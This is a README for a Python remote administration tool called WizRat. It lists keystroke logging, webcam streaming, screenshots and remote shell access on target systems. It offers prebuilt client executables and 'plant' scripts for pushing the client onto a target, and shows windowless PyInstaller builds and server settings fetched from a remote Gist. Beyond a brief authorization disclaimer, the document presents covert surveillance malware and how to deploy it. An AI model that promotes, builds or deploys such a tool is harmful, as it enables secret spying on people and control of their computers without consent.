# WizRat - Remote Administration Tool
<img src="https://github.com/aamitn/wizrat/blob/7833f604cc688ea41223964a1a9f6840ab31eeda/assets/icon.png">
WizRat is a Python-based Remote Administration Tool (RAT) that provides secure remote system management capabilities through a graphical user interface.


## Binary Release

| **Platform** | **Release**                                                         | **Format** |
|--------------|---------------------------------------------------------------------|------------|
| Windows      | [WinRelease](https://github.com/aamitn/wizrat/releases/tag/0.6.0)   | .exe       |
| Linux        | [TBA](#)                                                            | .pyc       |
| MacOS        | [TBA](#)                                                            | .pyc       |


Run `plant.cmd` / `plant_admin.cmd` from same directory where `client.exe` is located to push it inside target/client system

## Linters Used : Pylint with autopep8

## Features

- Real-time remote system monitoring
- Live camera streaming capabilities 
- Remote screenshot functionality
- Custom command execution with remote shell access
- Real-Time keystroke capturing and streaming from remote system
- Secure socket-based communication
- Screenshot viewer
- Configurable server/client settings

## Prerequisites

- Python 3.x
- Dependencies (install via `pip install -r requirements.txt`):

## Installation

1. Clone the repository:
```sh
git clone https://github.com/aamitn/wizrat.git
cd wizrat
```

2. Install dependencies:
```sh
pip install -r requirements.txt
```

## Usage

1. Start the server:
```sh
python server.py
```

2. Run the client on target system:
```sh
python client.py
```

3. Use the GUI interface to:
   - Monitor connected clients
   - View live camera feed
   - Capture screenshots
   - Send commands
   - Manage connections

## Configuration

WizRat uses a tiered configuration approach:

1. Primary configuration is loaded from a GitHub Gist defined by `GIST_URL` in `config.py`
2. If the Gist is unavailable, fallback settings from `config.py` are used

### Configuration Sources

#### GitHub Gist (Primary)
- Defined by `GIST_URL` in `config.py`
- Allows dynamic configuration updates
- Contains all server and client settings

#### Local Fallback (`config.py`)
Default settings used when Gist is unavailable:
- Server IP address (`SERVER_FALLBACK_IP`)
- Port numbers (`SERVER_FALLBACK_PORT`)
- Camera server settings (`CAM_SERVER_PORT`, `CAM_FPS`, etc.)
- Other connection parameters

### Configurable Parameters

- Server/Client IP addresses
- Port numbers for main and camera servers
- Camera settings (FPS, quality, frame width)
- Connection timeout values
- Retry intervals
- Debug flags

To modify the configuration:
1. Update the Gist URL in `config.py`
2. Or modify fallback values directly in `config.py`


## Building Executables

### Using PyInstaller
Convert Python scripts to standalone executables:
```sh
pyinstaller --noconsole --onefile --icon=icon.ico server.py
pyinstaller --noconsole --onefile --icon=icon.ico client.py
```

### Using Auto-PY-to-EXE (GUI Alternative)
A graphical interface for PyInstaller:
1. Install auto-py-to-exe:
```sh
pip install auto-py-to-exe
```
2. Launch the GUI:
```sh
auto-py-to-exe
```
3. Select your Python script and build options
4. Click "Convert" to generate the executable

## Generating Requirements

### Using pip-chill
Generate requirements with exact versions:
```sh
pip install pip-chill
pip-chill --no-chill -v > requirements.txt
```

For requirements without version constraints:
```sh
pip-chill --no-chill --no-version -v > requirements.txt
```

### Using pipreqs
Generate requirements based on imports:
```sh
pip install pipreqs
pipreqs .
```

## Downloads

Pre-built executables and deployment scripts are available in the [releases](https://github.com/yourusername/wizrat/releases) section:
- `server.exe` - Standalone server executable
- `client.exe` - Standalone client executable
- `plant_admin.cmd` - Deployment script (administrative privileges)
- `plant.cmd` - Deployment script (user privileges)


## Security Notice

This tool is for educational and authorized testing purposes only. Always:
- Obtain proper authorization before use
- Follow applicable laws and regulations
- Use responsibly and ethically

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer

The authors are not responsible for any misuse or damage caused by this program.

